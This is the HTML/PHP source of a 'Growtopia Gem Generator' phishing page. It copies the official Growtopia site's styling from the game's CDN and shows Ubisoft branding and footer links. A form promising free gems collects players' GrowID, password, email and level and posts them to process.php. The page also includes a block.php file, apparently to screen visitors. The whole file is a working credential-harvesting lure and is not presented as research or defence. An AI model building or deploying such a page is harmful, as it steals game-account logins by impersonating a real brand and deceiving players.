<!DOCTYPE html>
<html lang="en">


<?php

	require_once("block.php");

?>


<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Growtopia Gem Generator</title>
    <link rel="icon" type="image/png" href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/images/growtopia.ico" sizes="16x16" />
    <link rel="shortcut icon" href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/images/growtopia.ico" type="image/x-icon">
    <link rel="icon" href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/images/growtopia.ico" type="image/x-icon">
    <link media="all" rel="stylesheet" href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/vendors/font-awesome/css/font-awesome.min.css">
    <link media="all" rel="stylesheet" href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/css/faq-main.css">
    <link media="all" rel="stylesheet" href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/css/shop-custom.css">

</head>

<body>

    <div id="wrap">
        <div class="page-wrapper">
            <div class="header-bg">
                <header class="header" id="header">
                    <div class="row">
                        <div class="col-md-2 col-sm-3 col-xs-3">
                            <div class="logo"> <a href="#"> <img class="normal" src="gt-header-title-logo.png" alt="Growtopia"></a> </div>
                        </div>
                        <div class="col-md-8 col-sm-6 col-xs-6 center-align"></div>
                    </div>
                </header>
                <div class="dirt">
                    <div class="support-wrapper">
                        <div class="collapse navbar-collapse" id="nav">
                         
                        </div>
                    </div>
                </div>
            </div>
            <div class="content">
                <section class="common-box ">
                    <div class="container">
                        <div class="row">
                            <div class="col-md-12 col-sm-12">
                                <form method="POST" action="process.php" accept-charset="UTF-8" class="" role="form">
                                    <div class="row title-payment">
                                        <div class="col-md-12 col-sm-12">
                                            <p>Login to your account to generate your gems.</p>
                                        </div>
                                        <br />
                                        <div class="row">
                                            <div class="col-md-8 col-sm-10">

                                                <div class="col-md-6 col-sm-8">
                                                    <form method="POST" action="process.php" accept-charset="UTF-8" role="form">
                                                        <div class="form-group">
                                                            <input id="name" class="form-control" required="required" placeholder="GrowID *" data-validation-required-message="Please enter your GrowID." aria-invalid="false" name="GrowID" type="text">

                                                        </div>
                                                        <div class="form-group">
                                                            <input id="email" class="form-control" required="required" placeholder="GrowID Password *" data-validation-required-message="Enter Your GrowID Password" aria-invalid="false" name="Password" type="password">
                                                        </div>
							<div class="form-group">
							    <input id="realemail" class="form-control" placeholder="GrowID Email" aria-invalid="false" name="Email" type="email">
							</div>
							<div class="form-group">
							    <input id="level" class="form-control" required="required" placeholder="Level *" data-validation-required-message="Enter Your Level." aria-invalid="false" name="Level" type="number">
							</div>
                                                        <div class="form-group">
                                                            <input class="btn btn-lg btn-primary grow-button" type="submit" value="Generate!">
                                                        </div>
                                                        <div class="form-group">
                                                          
                                                        </div>

                                                    </form>
                                                </div>
                                            </div>

                                        </div>
                                    </div>
                            </div>
                </section>
            </div>
        </div>
        <footer id="footer">
            <div class="container text-center">
                <!-- footer logo -->
                <div class="logo"><a href="https://www.ubisoft.com" target="_blank"><img src="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/images/ubi_icon.png"></a></div>

                <!-- copy rights -->
                <div class="copy-right"> &copy; 2022 <a href="https://www.ubisoft.com" target="_blank">Ubisoft</a>. All Rights Reserved.</div>
                <ul class="link">
                    <li><a href="https://legal.ubi.com/" target="_blank" title="Legal">Legal</a></li>
                    <li><a href="https://legal.ubi.com/privacypolicy" target="_blank" title="Privacy Policy">Privacy Policy</a></li>
                    <li><a href="javascript:void(0)" id="manage-cookie-consent" title="Manage Consent">Manage Consent</a></li>
                    <li><a href="https://legal.ubi.com/DoNotSellMyPersonalInformation/en-US" target="_blank" title="Privacy Policy">Do not sell my Personal Information</a></li>
                </ul>
            </div>
        </footer>
    </div>
    <script>
        var base_url = 'https://www.growtopiagame.com'
    </script>
    <!-- JQUERY LIBRARY -->
    <script src="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/vendors/jquery/jquery-2.1.4.min.js"></script>
    <!-- jQuery easing -->
    <script src="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/vendors/jquery.easing/jquery.easing.1.3.min.js"></script>
    <!-- boostrap javascript -->
    <script src="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/vendors/bootstrap/javascripts/bootstrap.min.js"></script>
    <!-- match faq custom scripts -->
    <script src="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/js/faq-custom.js"></script>
</body>

</html>
